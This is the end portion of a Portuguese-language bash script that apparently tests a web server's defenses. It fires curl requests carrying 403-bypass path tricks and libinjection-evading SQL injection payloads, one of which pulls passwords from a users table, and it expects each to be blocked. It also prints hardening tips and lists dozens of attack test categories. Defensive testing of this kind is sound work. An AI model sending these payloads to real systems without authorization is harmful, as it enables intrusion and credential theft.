    test_curl "403: .%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}.%2e/"
    test_curl "403: %3f (?)" "block" -A "$UA" -Lk --path-as-is "${URL}%3f"
    test_curl "403: %26 (&)" "block" -A "$UA" -Lk --path-as-is "${URL}%26"
    test_curl "403: %23 (#)" "block" -A "$UA" -Lk --path-as-is "${URL}%23"
    test_curl "403: %2e (.)" "block" -A "$UA" -Lk --path-as-is "${URL}%2e"
    test_curl "403: /." "block" -A "$UA" -Lk --path-as-is "${URL}/."
    test_curl "403: ?" "block" -A "$UA" -Lk --path-as-is "${URL}?"
    test_curl "403: ??" "block" -A "$UA" -Lk --path-as-is "${URL}??"
    test_curl "403: ???" "block" -A "$UA" -Lk --path-as-is "${URL}???"
    test_curl "403: //" "block" -A "$UA" -Lk --path-as-is "${URL}//"
    test_curl "403: /./" "block" -A "$UA" -Lk --path-as-is "${URL}/./"
    test_curl "403: .//./" "block" -A "$UA" -Lk --path-as-is "${URL}.//./"
    test_curl "403: //?anything" "block" -A "$UA" -Lk --path-as-is "${URL}//?anything"
    test_curl "403: #" "block" -A "$UA" -Lk --path-as-is "${URL}#"
    test_curl "403: /.randomstring" "block" -A "$UA" -Lk --path-as-is "${URL}/.randomstring"
    test_curl "403: ..;/" "block" -A "$UA" -Lk --path-as-is "${URL}..;/"
    test_curl "403: .html" "block" -A "$UA" -Lk --path-as-is "${URL}.html"
    test_curl "403: %20/" "block" -A "$UA" -Lk --path-as-is "${URL}%20/"
    test_curl "403: .json" "block" -A "$UA" -Lk --path-as-is "${URL}.json"
    test_curl "403: /*" "block" -A "$UA" -Lk --path-as-is "${URL}/*"
    test_curl "403: ./." "block" -A "$UA" -Lk --path-as-is "${URL}./."
    test_curl "403: /*/" "block" -A "$UA" -Lk --path-as-is "${URL}/*/"
    test_curl "403: /..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/"
    test_curl "403: //." "block" -A "$UA" -Lk --path-as-is "${URL}//."
    test_curl "403: ////" "block" -A "$UA" -Lk --path-as-is "${URL}////"
    
    print_subsection "SQLi libinjection Bypass (WAF/ModSecurity)"
    test_curl "403: SQLi 1.e(\")=' bypass" "block" -A "$UA" -Lk "${URL}/'%20or%201.e(%22)%3D'"
    test_curl "403: SQLi 1.e(ascii" "block" -A "$UA" -Lk "${URL}/1.e(ascii"
    test_curl "403: SQLi 1.e(substring(" "block" -A "$UA" -Lk "${URL}/1.e(substring("
    test_curl "403: SQLi full 1.e() bypass" "block" -A "$UA" -Lk "${URL}/1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'"
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Sobre 403 Bypass:${NC}"
    echo -e "  ${YELLOW}• Headers IP Spoofing:${NC} Bloqueie headers untrusted via Nginx"
    echo -e "  ${YELLOW}• Port Bypass:${NC} Não confie em X-Forwarded-Port de IPs externos"
    echo -e "  ${YELLOW}• URL Encoding:${NC} Normalize URLs antes de processá-las"
    echo -e "  ${YELLOW}• Path Traversal:${NC} Use realpath() e validação de path"
    echo -e "  ${YELLOW}• libinjection:${NC} Mantenha WAF/ModSecurity atualizado"
    echo -e "  ${YELLOW}• Nginx Config:${NC} Use 'merge_slashes on;' e normalize URIs"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# RESUMO FINAL
#==============================================================================
print_summary() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}                              RESUMO DOS TESTES                               ${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "  ${BOLD}URL Testada:${NC}     $URL"
    echo -e "  ${BOLD}Total de Testes:${NC} $TOTAL_TESTS"
    echo -e "  ${GREEN}Passaram:${NC}        $PASSED_TESTS"
    echo -e "  ${RED}Falharam:${NC}        $FAILED_TESTS"
    
    local success_rate=0
    [ $TOTAL_TESTS -gt 0 ] && success_rate=$((PASSED_TESTS * 100 / TOTAL_TESTS))
    
    echo ""
    if [ $success_rate -ge 80 ]; then
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${GREEN}${success_rate}%${NC} ✅"
    elif [ $success_rate -ge 50 ]; then
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${YELLOW}${success_rate}%${NC} ⚠️"
    else
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${RED}${success_rate}%${NC} ❌"
    fi
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
}

#==============================================================================
# SELEÇÃO DE USER-AGENT
#==============================================================================
select_user_agent() {
    echo -e "${BOLD}Selecione um User-Agent:${NC}"
    for i in "${!USER_AGENTS[@]}"; do
        printf "  %d. %s...\n" "$((i+1))" "${USER_AGENTS[i]:0:60}"
    done
    while true; do
        read -rp "Número (1-${#USER_AGENTS[@]}): " UA_INDEX
        if [[ "$UA_INDEX" =~ ^[0-9]+$ ]] && [ "$UA_INDEX" -ge 1 ] && [ "$UA_INDEX" -le "${#USER_AGENTS[@]}" ]; then
            UA="${USER_AGENTS[$((UA_INDEX-1))]}"
            break
        fi
        echo -e "${RED}Número inválido.${NC}"
    done
}

#==============================================================================
# MAIN
#==============================================================================
CATEGORY="all"

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help) 
            echo "Uso: $0 [OPÇÕES] <URL>"
            echo ""
            echo "Opções:"
            echo "  -h, --help              Mostra esta ajuda"
            echo "  -v, --verbose           Modo verboso"
            echo "  -o, --output <arquivo>  Salva resultados em arquivo"
            echo "  -u, --user-agent <num>  Seleciona User-Agent (1-15)"
            echo "  -c, --category <cat>    Executa categoria específica"
            echo "  -f, --filter <filtro>   Filtra resultados: all, pass, fail"
            echo ""
            echo "Filtros disponíveis:"
            echo "  all   - Mostra todos os testes (padrão)"
            echo "  pass  - Mostra apenas testes que PASSARAM"
            echo "  fail  - Mostra apenas testes que FALHARAM"
            echo ""
            echo "Categorias disponíveis:"
            echo "  all, method, cookie, query, host, uri, header, contenttype,"
            echo "  encoding, xff, range, smuggling, nginx, php, database, ssrf,"
            echo "  pathbypass, injection, ratelimit, protocol, hopbyhop, cache,"
            echo "  contamination, responsesmuggling, h2c, ssi, cdn, xslt, waf,"
            echo "  ports, ssl, useragent, referer, fakebots, 403bypass,"
            echo "  clickjacking, secheaders, session, css, email, credentials,"
            echo "  enumeration, formatstring, csrf"
            exit 0 
            ;;
        -v|--verbose) VERBOSE=true; shift ;;
        -o|--output) OUTPUT_FILE="$2"; shift 2 ;;
        -u|--user-agent) UA="${USER_AGENTS[$(($2-1))]}"; shift 2 ;;
        -c|--category) CATEGORY="$2"; shift 2 ;;
        -f|--filter) 
            case "$2" in
                all|pass|fail) FILTER="$2" ;;
                *) echo -e "${RED}Filtro inválido: $2. Use: all, pass, fail${NC}"; exit 1 ;;
            esac
            shift 2 
            ;;
        -*) echo "Opção desconhecida: $1"; exit 1 ;;
        *) URL="$1"; shift ;;
    esac
done

[ -z "$URL" ] && { show_banner; echo -e "${RED}Erro: URL não fornecida.${NC}"; exit 1; }
[[ ! "$URL" =~ ^https?:// ]] && { echo -e "${RED}URL deve começar com http:// ou https://${NC}"; exit 1; }

show_banner
[ -z "$UA" ] && select_user_agent

echo -e "${BOLD}Iniciando testes em:${NC} $URL"

# Mostrar filtro ativo
if [ "$FILTER" = "pass" ]; then
    echo -e "${BOLD}Filtro ativo:${NC} ${GREEN}Mostrando apenas testes que PASSARAM${NC}"
elif [ "$FILTER" = "fail" ]; then
    echo -e "${BOLD}Filtro ativo:${NC} ${RED}Mostrando apenas testes que FALHARAM${NC}"
fi

# Executar testes baseado na categoria
case $CATEGORY in
    method) test_all_http_methods ;;
    cookie) test_malicious_cookies ;;
    query) test_malicious_query ;;
    useragent) test_bad_user_agents; test_good_bots; test_fake_bots ;;
    referer|referer-all) test_bad_referers ;;
    referer-spam|spam) test_referers_spam ;;
    referer-seo|seoblackhat) test_referers_seo_blackhat ;;
    referer-injection|injection-referer) test_referers_injection ;;
    host) test_invalid_host ;;
    uri) test_malicious_uri ;;
    header) test_header_injection ;;
    contenttype) test_content_type ;;
    encoding) test_accept_encoding ;;
    xff) test_xff_spoofing ;;
    range) test_range_header ;;
    smuggling) test_http_smuggling ;;
    fakebots) test_fake_bots ;;
    nginx) test_nginx_attacks ;;
    php) test_php_attacks ;;
    database|db) test_database_attacks ;;
    ssrf) test_ssrf_attacks ;;
    pathbypass|bypass) test_path_bypass ;;
    injection|injections) test_injection_vulnerabilities ;;
    ratelimit|bruteforce|login) test_rate_limiting ;;
    protocol|protocols|http) test_http_protocols ;;
    hopbyhop|hbh) test_hop_by_hop_headers ;;
    cache|cachepoisoning|cachedeception) test_cache_poisoning ;;
    contamination|connectioncontamination) test_connection_contamination ;;
    responsesmuggling|desync) test_response_smuggling ;;
    h2c|h2csmuggling) test_h2c_smuggling ;;
    ssi|esi|ssiesi) test_ssi_esi_injection ;;
    cdn|cloudflare|cdnbypass) test_cdn_bypass ;;
    xslt|xsltinjection) test_xslt_injection ;;
    waf|wafbypass|proxy) test_waf_bypass ;;
    ports|exposedports|portscan) test_exposed_ports ;;
    ssl|tls|ssltls|ciphers) test_ssl_tls ;;
    403bypass|403|forbidden) test_403_bypass ;;
    clickjacking|xfo|framebusting) test_clickjacking ;;
    secheaders|securityheaders|headers) test_security_headers ;;
    session|cookies|cookiesecurity) test_session_security ;;
    css|cssinjection) test_css_injection ;;
    email|smtp|imap|emailinjection) test_email_injection ;;
    credentials|defaultcreds|adminpanels) test_default_credentials ;;
    enumeration|userenum|accountenum) test_account_enumeration ;;
    formatstring|printf) test_format_string ;;
    csrf|xsrf) test_csrf_protection ;;
    all)
        test_all_http_methods
        test_malicious_cookies
        test_malicious_query
        test_invalid_host
        test_malicious_uri
        test_header_injection
        test_content_type
        test_accept_encoding
        test_xff_spoofing
        test_range_header
        test_http_smuggling
        test_nginx_attacks
        test_php_attacks
        test_database_attacks
        test_ssrf_attacks
        test_injection_vulnerabilities
        test_rate_limiting
        test_path_bypass
        test_http_protocols
        test_hop_by_hop_headers
        test_cache_poisoning
        test_connection_contamination
        test_response_smuggling
        test_h2c_smuggling
        test_ssi_esi_injection
        test_cdn_bypass
        test_xslt_injection
        test_waf_bypass
        test_exposed_ports
        test_ssl_tls
        test_403_bypass
        test_clickjacking
        test_security_headers
        test_session_security
        test_css_injection
        test_email_injection
        test_default_credentials
        test_account_enumeration
        test_format_string
        test_csrf_protection
        test_bad_user_agents
        test_bad_referers
        test_good_bots
        test_fake_bots
        ;;
    *) echo "Categoria desconhecida: $CATEGORY"; exit 1 ;;
esac

print_summary
exit 0
